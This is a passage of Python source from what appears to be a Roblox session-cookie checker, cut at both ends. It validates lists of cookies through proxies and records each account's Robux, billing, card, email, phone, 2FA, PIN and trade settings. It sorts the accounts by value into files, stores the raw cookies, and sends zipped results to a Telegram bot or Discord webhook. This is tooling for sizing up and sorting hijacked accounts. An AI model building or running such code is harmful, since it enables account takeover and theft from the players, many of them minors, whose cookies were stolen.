                        'Pending'           : isPendingTimed,
                        'Donate (1 Year)'   : isDonate1YearTimed,
                        'Donate (All Time)' : isDonateAllTimeTimed,
                        'Custom Gamepasses' : isCustomGamepassesTimed,
                        'Rap'               : isRapTimed,
                        'Card'              : isCardTimed,
                        'Premium'           : isPremiumTimed,
                        'Gamepasses'        : isGamepassesTimed,
                        'Badges'            : isBadgesTimed,
                        'Favorite Places'   : isFavoritePlacesTimed,
                        'Bundles'           : isBundlesTimed
                    }

                    for key, value in totalData_UPDATE.items():
                        if isinstance(totalData_CURRENT[key], int):
                            totalData_CURRENT[key] += int(value)

                # Сортировка
                if config['Roblox']['CookieChecker']['Sorting']['Sort']:
                    async def isSortingCookiesFunc(category: str, value: int | str, dateOfCheck: str):
                        if not (value and config['Roblox']['CookieChecker']['Main'][category] and (type(config['Roblox']['CookieChecker']['Sorting'][category]) is not bool and config['Roblox']['CookieChecker']['Sorting'][category][0] or config['Roblox']['CookieChecker']['Sorting'][category])):
                            return

                        categoryName = ' '.join(category.split('_'))
                        if type(value) is int and str(value) != '0':
                            sortValues = await getSortValuesFromCategory(category, True)
                            if not sortValues: return

                            os.makedirs(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}\\Sort\\{categoryName}', exist_ok=True)
                            for sortValue in sortValues:
                                if value >= sortValue:
                                    async with aiofiles.open(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}\\Sort\\{categoryName}\\{sortValue}+.txt', 'a', encoding='UTF-8') as file:
                                        await file.write(f'{isAccountLinkN}{isCountryRegistrationN}{f'ID: {isID} | ' if config['Roblox']['CookieChecker']['Main']['ID'] else ''}{isNameN}{isDisplayNameN}{isRegistrationDateN}{isRobuxN}{isBillingN}{isTransactionsForYearN}{isDonateAllTimeN}{isRapN}{isCardN}{isPremiumN}{isGamepassesN}{isCustomGamepassesN}{isBadgesN}{isFavoritePlacesN}{isBundlesN}{isInventoryPrivacyN}{isTradePrivacyN}{isCanTradeN}{isSessionsN}{isEmailN}{isPhoneN}{is2FAN}{isPinN}{isAbove13N}{isVerifiedAgeN}{isVoiceN}{isNumberOfFriendsN}{isNumberOfFollowersN}{isNumberOfFollowingsN}{isRobloxBadgesN}{isXCSRFTokenN}Cookie: {cookie}\n')
                        elif type(value) is str:
                            os.makedirs(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}\\Sort\\{categoryName}', exist_ok=True)
                            async with aiofiles.open(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}\\Sort\\{categoryName}\\{value}.txt', 'a', encoding='UTF-8') as file:
                                await file.write(f'{isAccountLinkN}{isCountryRegistrationN}{f'ID: {isID} | ' if config['Roblox']['CookieChecker']['Main']['ID'] else ''}{isNameN}{isDisplayNameN}{isRegistrationDateN}{isRobuxN}{isBillingN}{isTransactionsForYearN}{isDonateAllTimeN}{isRapN}{isCardN}{isPremiumN}{isGamepassesN}{isCustomGamepassesN}{isBadgesN}{isFavoritePlacesN}{isBundlesN}{isInventoryPrivacyN}{isTradePrivacyN}{isCanTradeN}{isSessionsN}{isEmailN}{isPhoneN}{is2FAN}{isPinN}{isAbove13N}{isVerifiedAgeN}{isVoiceN}{isNumberOfFriendsN}{isNumberOfFollowersN}{isNumberOfFollowingsN}{isRobloxBadgesN}{isXCSRFTokenN}Cookie: {cookie}\n')

                    await asyncio.gather(*(
                        isSortingCookiesFunc('Country_Registration',       isCountryRegistrationSorting,    dateOfCheck),
                        isSortingCookiesFunc('ID',                         str(isID),                       dateOfCheck),
                        isSortingCookiesFunc('Name',                       isNameClean,                     dateOfCheck),
                        isSortingCookiesFunc('Extended_Registration_Date', isRegistrationDateInDaysSorting, dateOfCheck),
                        isSortingCookiesFunc('Robux',                      isRobuxTimed,                    dateOfCheck),
                        isSortingCookiesFunc('Billing',                    isBillingTimed,                  dateOfCheck),
                        isSortingCookiesFunc('Pending',                    isPendingTimed,                  dateOfCheck),
                        isSortingCookiesFunc('Donate_1_Year',              isDonate1YearTimed,              dateOfCheck),
                        isSortingCookiesFunc('Donate_All_Time',            isDonateAllTimeTimed,            dateOfCheck),
                        isSortingCookiesFunc('Rap',                        isRapTimed,                      dateOfCheck),
                        isSortingCookiesFunc('Card',                       isCardTimed,                     dateOfCheck),
                        isSortingCookiesFunc('Premium',                    isPremiumSorting,                dateOfCheck),
                        isSortingCookiesFunc('Gamepasses',                 isGamepassesTimed,               dateOfCheck),
                        isSortingCookiesFunc('Custom_Gamepasses',          isCustomGamepassesTimed,         dateOfCheck),
                        isSortingCookiesFunc('Badges',                     isBadgesTimed,                   dateOfCheck),
                        isSortingCookiesFunc('Favorite_Places',            isFavoritePlacesTimed,           dateOfCheck),
                        isSortingCookiesFunc('Bundles',                    isBundlesTimed,                  dateOfCheck),
                        isSortingCookiesFunc('Inventory_Privacy',          isInventoryPrivacyClean,         dateOfCheck),
                        isSortingCookiesFunc('Trade_Privacy',              isTradePrivacyClean,             dateOfCheck),
                        isSortingCookiesFunc('Can_Trade',                  isCanTradeClean,                 dateOfCheck),
                        isSortingCookiesFunc('Sessions',                   isSessionsSorting,               dateOfCheck),
                        isSortingCookiesFunc('Email',                      isEmailSorting,                  dateOfCheck),
                        isSortingCookiesFunc('Phone',                      isPhoneSorting,                  dateOfCheck),
                        isSortingCookiesFunc('2FA',                        is2FASorting,                    dateOfCheck),
                        isSortingCookiesFunc('Pin',                        isPinSorting,                    dateOfCheck),
                        isSortingCookiesFunc('Above_13',                   isAbove13Sorting,                dateOfCheck),
                        isSortingCookiesFunc('Verified_Age',               isVerifiedAgeSorting,            dateOfCheck),
                        isSortingCookiesFunc('Voice',                      isVoiceSorting,                  dateOfCheck),
                        isSortingCookiesFunc('Friends',                    isNumberOfFriendsSorting,        dateOfCheck),
                        isSortingCookiesFunc('Followers',                  isNumberOfFollowersSorting,      dateOfCheck),
                        isSortingCookiesFunc('Followings',                 isNumberOfFollowingsSorting,     dateOfCheck)
                    ))

                if config['Roblox']['CookieControlPanel']['Save_Cookies_Checked_By_Checker']:
                    config['Roblox']['CookieControlPanel']['RobloxCookieCheckerHistory'][f'{cookie[115:130]}...{cookie[-15:-1]}'] = [isCountryRegistrationSorting if isCountryRegistrationSorting else '?', isID if config['Roblox']['CookieChecker']['Main']['ID'] else '?', isNameClean if isNameClean else '?', isDisplayNameClean if isDisplayNameClean else '?', isRegistrationDateClean if isRegistrationDateClean else '?', isRegistrationDateInDaysSorting if isRegistrationDateInDaysSorting else '?', isRobuxTimed if isRobuxTimed else '?', isBillingTimed if isBillingTimed else '?', isPendingTimed if config['Roblox']['CookieChecker']['Main']['Pending'] else '?', isDonate1YearTimed if config['Roblox']['CookieChecker']['Main']['Donate_1_Year'] else '?', isDonateAllTimeTimed if isDonateAllTimeTimed else '?', isCustomGamepassesTimed if isCustomGamepassesTimed else '?', isRapTimed if isRapTimed else '?', isCardTimed if isCardTimed else '?', isPremiumSorting if isPremiumSorting else '?', isGamepassesTimed if isGamepassesTimed else '?', isBadgesTimed if isBadgesTimed else '?', isFavoritePlacesTimed if isFavoritePlacesTimed else '?', isBundlesTimed if isBundlesTimed else '?', isInventoryPrivacyClean if isInventoryPrivacyClean else '?', isTradePrivacyClean if isTradePrivacyClean else '?', isCanTradeClean if isCanTradeClean else '?', isSessionsSorting if isSessionsSorting else '?', isEmailSorting if isEmailSorting else '?', isPhoneSorting if isPhoneSorting else '?', is2FASorting if is2FASorting else '?', isPinSorting if isPinSorting else '?', isAbove13Sorting if isAbove13Sorting else '?', isVerifiedAgeSorting if isVerifiedAgeSorting else '?', isVoiceSorting if isVoiceSorting else '?', isNumberOfFriendsSorting if isNumberOfFriendsSorting else '?', isNumberOfFollowersSorting if isNumberOfFollowersSorting else '?', isNumberOfFollowingsSorting if isNumberOfFollowingsSorting else '?', isRobloxBadgesClean if isRobloxBadgesClean else '?', isXCSRFTokenClean if isXCSRFTokenClean else '?', cookie]

                os.makedirs(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}', exist_ok=True)
                async with aiofiles.open(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}\\{fileName}.txt', 'a', encoding='UTF-8') as file:
                    await file.write(f'{isAccountLinkN}{isCountryRegistrationN}{f'ID: {isID} | ' if config['Roblox']['CookieChecker']['Main']['ID'] else ''}{isNameN}{isDisplayNameN}{isRegistrationDateN}{isRobuxN}{isBillingN}{isTransactionsForYearN}{isDonateAllTimeN}{isRapN}{isCardN}{isPremiumN}{isGamepassesN}{isCustomGamepassesN}{isBadgesN}{isFavoritePlacesN}{isBundlesN}{isInventoryPrivacyN}{isTradePrivacyN}{isCanTradeN}{isSessionsN}{isEmailN}{isPhoneN}{is2FAN}{isPinN}{isAbove13N}{isVerifiedAgeN}{isVoiceN}{isNumberOfFriendsN}{isNumberOfFollowersN}{isNumberOfFollowingsN}{isRobloxBadgesN}{isXCSRFTokenN}Cookie: {cookie}\n')

                async with locker:
                    validCount += 1
                    if config['Roblox']['CookieChecker']['General']['Output_Total'] and cookieCount: await removeLines(17)
                    sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}]{ANSI.CLEAR} {isAccountLink}{isCountryRegistration}{f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}ID:{ANSI.CLEAR} {isID} | ' if config['Roblox']['CookieChecker']['Main']['ID'] else ''}{isName}{isDisplayName}{isRegistrationDate}{isRobux}{isBilling}{isTransactionsForYear}{isDonateAllTime}{isRap}{isCard}{isPremium}{isGamepasses}{isCustomGamepasses}{isBadges}{isFavoritePlaces}{isBundles}{isInventoryPrivacy}{isTradePrivacy}{isCanTrade}{isSessions}{isEmail}{isPhone}{is2FA}{isPin}{isAbove13}{isVerifiedAge}{isVoice}{isNumberOfFriends}{isNumberOfFollowers}{isNumberOfFollowings}{isRobloxBadges}{isXCSRFToken}{f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Cookie: {ANSI.FG.YELLOW}{cookie}{ANSI.CLEAR}' if config['Roblox']['CookieChecker']['Main']['Cookie_In_Console'] else ''}\n')
            else:
                async with locker:
                    if config['Roblox']['CookieChecker']['General']['Output_Total'] and cookieCount: await removeLines(17)
                    sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.RED}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Invalid_Cookie}{ANSI.CLEAR}\n')

            sys.stdout.flush()
            cookieCount += 1
            if config['Roblox']['CookieChecker']['General']['Output_Total']: await totalOutputRCC()

    dataCheckTasks = [threadingCheckData(cookie, proxiesFromFile if config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'] else None) for cookie in checkReadyRobloxCookies]
    await asyncio.gather(*dataCheckTasks)
    await autoSaveConfig()

    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Checking_Complete}\n\n')
    if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()

    if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
        await makeArchive(f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}')

        messageText = f'*💜 {MT_Roblox} {MT_Cookie_Checker.lower()}\n\n🟢 {MT_Valid}: {validCount}\n🔴 {MT_Invalid}: {cookieCount - validCount}\n\n{f'💎 Robux: {totalData_CURRENT['Robux']}\n' if type(totalData_CURRENT['Robux']) is int else ''}{f'💵 Billing: {totalData_CURRENT['Billing']}\n' if type(totalData_CURRENT['Billing']) is int else ''}{f'⌛ Pending: {totalData_CURRENT['Pending']}\n' if type(totalData_CURRENT['Pending']) is int else ''}{f'💰 Donate \\(1 Year\\): {totalData_CURRENT['Donate (1 Year)']}\n' if type(totalData_CURRENT['Donate (1 Year)']) is int else ''}{f'💰 Donate \\(All Time\\): {totalData_CURRENT['Donate (All Time)']}\n' if type(totalData_CURRENT['Donate (All Time)']) is int else ''}{f'🚀 Rap: {totalData_CURRENT['Rap']}\n' if type(totalData_CURRENT['Rap']) is int else ''}{f'💳 Card: {totalData_CURRENT['Card']}\n' if type(totalData_CURRENT['Card']) is int else ''}{f'👑 Premium: {totalData_CURRENT['Premium']}\n' if type(totalData_CURRENT['Premium']) is int else ''}{f'🎫 Gamepasses: {totalData_CURRENT['Gamepasses']}\n' if type(totalData_CURRENT['Gamepasses']) is int else ''}{f'🎫 Custom Gamepasses: {totalData_CURRENT['Custom Gamepasses']}\n' if type(totalData_CURRENT['Custom Gamepasses']) is int else ''}{f'🏆 Badges: {totalData_CURRENT['Badges']}\n' if type(totalData_CURRENT['Badges']) is int else ''}{f'⭐ Favorite Places: {totalData_CURRENT['Favorite Places']}\n' if type(totalData_CURRENT['Favorite Places']) is int else ''}{f'📦 Bundles: {totalData_CURRENT['Bundles']}' if type(totalData_CURRENT['Bundles']) is int else ''}*'

        if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot']:
            await sendMessageTelegramBot(str(config['Roblox']['General']['Outputs']['Telegram_Bot_Token']), str(config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']), messageText, f'Roblox\\Cookie Checker\\outputs\\{dateOfCheck}.zip')

        if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
            await sendMessageDiscordWebhook(str(config['Roblox']['General']['Outputs']['Discord_Webhook_URL']), messageText.replace('*', '**'), 'Roblox\\Cookie Checker\\outputs', f'{dateOfCheck}.zip')
        sys.stdout.write('\n')

    await waitingInput()

def printRCCGeneral():
    for index, data in enumerate(cookieData.listOfCookieData):
        sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(cookieData.listOfCookieData))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Main'][data[1]] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {data[0]}{f'{ANSI.CLEAR + data[2]}*{ANSI.CLEAR}'}\n')

async def RCCGeneralCategory(printItems=False, categoryName='') -> list:
    noDuplicatedArrays = []
    noDuplicatedArrays = [item for item in config['Roblox']['CookieChecker']['Main'][f'{categoryName}_List']
                         if item and len(str(item[-2])) <= 100 and item not in noDuplicatedArrays]
    config['Roblox']['CookieChecker']['Main'][f'{categoryName}_List'] = noDuplicatedArrays
    await autoSaveConfig()

    if printItems:
        for index, item in enumerate(noDuplicatedArrays):
            sys.stdout.write(f' {ANSI.CLEAR + ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(noDuplicatedArrays))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if item[-1] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {item[-2]}\n')
    return noDuplicatedArrays

def removeItemFromCategory(category: list, remove: str | int):
    for item in category:
        if remove in item:
            del category[category.index(item)]

def checkExist(input: str, category: list) -> bool | None:
    listIDs = {id[1] if category == 'Custom_Gamepasses_List' else str(id[0]) for id in config['Roblox']['CookieChecker']['Main'][f'{category}_List']}
    if input in listIDs:
        return True

def printRCCPlaces():
    for index, place in enumerate(listOfPlaces):
        sys.stdout.write(f' {ANSI.CLEAR + ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(listOfPlaces))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {place.placeNames[0]}\n')

async def RCCPlaceContextMenu(indexPlace: int):
    async def removeLinesGamepassesAndOrBadges():
        if getattr(listOfPlaces[indexPlace], 'Gamepasses', False) and getattr(listOfPlaces[indexPlace], 'Badges', False):
            await removeLines(9)
        else:
            await removeLines(8)

    async def printPlaceGamepasses():
        for index, gamepass in enumerate(listOfPlaces[indexPlace].Gamepasses.listOfGamepasses):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(listOfPlaces[indexPlace].Gamepasses.listOfGamepasses))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][gamepass[2]] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {gamepass[0]}{ANSI.CLEAR}\n')
    
    async def openPlaceGamepasses():
        whileTrueStage5 = True
        await removeLinesGamepassesAndOrBadges()
        while whileTrueStage5:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Places}\\{listOfPlaces[indexPlace].placeNames[0]}\\{MT_Gamepasses}{ANSI.CLEAR}\n\n')
            await printPlaceGamepasses()
            sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
            settingsRCCPlacesPlaceGamepassesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
            if settingsRCCPlacesPlaceGamepassesTab == '0': whileTrueStage5 = False
            elif settingsRCCPlacesPlaceGamepassesTab.isdigit() and int(settingsRCCPlacesPlaceGamepassesTab) <= len(listOfPlaces[indexPlace].Gamepasses.listOfGamepasses):
                config['Roblox']['CookieChecker'][f'{listOfPlaces[indexPlace].__name__}'][listOfPlaces[indexPlace].Gamepasses.listOfGamepasses[int(settingsRCCPlacesPlaceGamepassesTab) - 1][2]] ^= True
                await autoSaveConfig()
            elif settingsRCCPlacesPlaceGamepassesTab in ('+', '='):
                for gamepass in listOfPlaces[indexPlace].Gamepasses.listOfGamepasses:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][gamepass[2]] = True
                await autoSaveConfig()
            elif settingsRCCPlacesPlaceGamepassesTab in ('-', '_'):
                for gamepass in listOfPlaces[indexPlace].Gamepasses.listOfGamepasses:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][gamepass[2]] = False
                await autoSaveConfig()
            elif settingsRCCPlacesPlaceGamepassesTab.upper() in ('R', 'К'):
                loadConfig(configLoader['Loader']['Current_Config'])

            await cls()
            await lableASCII()

    async def printPlaceBadges():
        for index, badge in enumerate(listOfPlaces[indexPlace].Badges.listOfBadges):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(listOfPlaces[indexPlace].Badges.listOfBadges))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][badge[2]] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {badge[0]}{ANSI.CLEAR}\n')
    
    async def openPlaceBadges():
        whileTrueStage5 = True
        await removeLinesGamepassesAndOrBadges()
        while whileTrueStage5:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Places}\\{listOfPlaces[indexPlace].placeNames[0]}\\{MT_Badges}{ANSI.CLEAR}\n\n')
            await printPlaceBadges()
            sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
            settingsRCCPlacesPlaceBadgesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
            if settingsRCCPlacesPlaceBadgesTab == '0': whileTrueStage5 = False
            elif settingsRCCPlacesPlaceBadgesTab.isdigit() and int(settingsRCCPlacesPlaceBadgesTab) <= len(listOfPlaces[indexPlace].Badges.listOfBadges):
                config['Roblox']['CookieChecker'][f'{listOfPlaces[indexPlace].__name__}'][listOfPlaces[indexPlace].Badges.listOfBadges[int(settingsRCCPlacesPlaceBadgesTab) - 1][2]] ^= True
                await autoSaveConfig()
            elif settingsRCCPlacesPlaceBadgesTab in ('+', '='):
                for badge in listOfPlaces[indexPlace].Badges.listOfBadges:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][badge[2]] = True
                await autoSaveConfig()
            elif settingsRCCPlacesPlaceBadgesTab in ('-', '_'):
                for badge in listOfPlaces[indexPlace].Badges.listOfBadges:
                    config['Roblox']['CookieChecker'][listOfPlaces[indexPlace].__name__][badge[2]] = False
                await autoSaveConfig()
            elif settingsRCCPlacesPlaceBadgesTab.upper() in ('R', 'К'):
                loadConfig(configLoader['Loader']['Current_Config'])

            await cls()
            await lableASCII()
    
    whileTrueStage4 = True
    await cls()
    await lableASCII()
    while whileTrueStage4:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Places}\\{listOfPlaces[indexPlace].placeNames[0]}{ANSI.CLEAR}\n\n')

        if   getattr(listOfPlaces[indexPlace], 'Gamepasses', False) and getattr(listOfPlaces[indexPlace], 'Badges', False):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Gamepasses}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Badges}{ANSI.CLEAR}\n')
        elif getattr(listOfPlaces[indexPlace], 'Gamepasses', False):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Gamepasses}{ANSI.CLEAR}\n')
        elif getattr(listOfPlaces[indexPlace], 'Badges', False):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Badges}{ANSI.CLEAR}\n')

        sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['Places'][listOfPlaces[indexPlace].placeNames[1]] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Check}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
        settingsRCCPlacesPlaceTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
        match settingsRCCPlacesPlaceTab.upper():
            case '1':
                if getattr(listOfPlaces[indexPlace], 'Gamepasses', False):
                    await openPlaceGamepasses()
                else:
                    await openPlaceBadges()
            case '2':
                if getattr(listOfPlaces[indexPlace], 'Badges', False) and getattr(listOfPlaces[indexPlace], 'Gamepasses', False):
                    await openPlaceBadges()
                else:
                    await removeLinesGamepassesAndOrBadges()
            case 'C' | 'С':
                config['Roblox']['CookieChecker']['Places'][listOfPlaces[indexPlace].placeNames[1]] ^= True
                await autoSaveConfig()
                await removeLinesGamepassesAndOrBadges()
            case '0':
                whileTrueStage4 = False
                await removeLinesGamepassesAndOrBadges()
            case 'F' | 'А':
                await cls()
                await lableASCII()
            case _:
                await removeLinesGamepassesAndOrBadges()

async def printRCCCustomPlaces():
    listOfRCCCustomPlaces = list(config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'])
    if listOfRCCCustomPlaces:
        for index, customPlace in enumerate(listOfRCCCustomPlaces):
            if str(listOfRCCCustomPlaces[index]).isdigit() and (str(listOfRCCCustomPlaces[index]) in config['Roblox']['CookieChecker']['CustomPlaces'] and (f'{str(listOfRCCCustomPlaces[index])}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] or f'{str(listOfRCCCustomPlaces[index])}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces'])):
                sys.stdout.write(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(listOfRCCCustomPlaces))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][2] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][0] if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][0] != f'Unknown_Normal_{customPlace}' else config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][1] if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][1][1] != f'Unknown_Default_{customPlace}' else f'Unknown_{customPlace}'} {f'({config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][0]})' if config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] else ''}\n')
            else:
                config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].remove(customPlace)
        await autoSaveConfig()

async def RCCCustomPlaceContextMenu(placeIndex: int):
    listOfRCCCustomPlaces = [str(customPlace) for customPlace in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']
                             if str(customPlace).isdigit() and str(customPlace) in config['Roblox']['CookieChecker']['CustomPlaces']]

    async def removeLinesCustomPlaces():
        if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] and f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
            await removeLines(10)
        else:
            await removeLines(9)

    async def printCustomPlaceGamepasses():
        for index, gamepass in enumerate(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']):
            sys.stdout.write(f' {ANSI.DECOR.BOLD}{f'[{ANSI.FG.PINK}{index + 1}{ANSI.CLEAR + ANSI.DECOR.BOLD}]'.rjust(len(str(len(config['Roblox']['CookieChecker']['CustomPlaces'][f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses']))) + 15)} ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if gamepass[2] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {gamepass[1]}{ANSI.CLEAR}\n')

    async def openCustomPlaceGamepasses():
        whileTrueStage6 = True
        await removeLinesCustomPlaces()
        while whileTrueStage6:
            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Checker}\\{MT_Custom_Places}\\{config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0] if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][0] != f'Unknown_Normal_{listOfRCCCustomPlaces[placeIndex]}' else config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][2][1] if config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][1] != f'Unknown_Default_{listOfRCCCustomPlaces[placeIndex]}' else f'Unknown_{listOfRCCCustomPlaces[placeIndex]}'}\\{MT_Gamepasses}{ANSI.CLEAR}\n\n')
            await printCustomPlaceGamepasses()
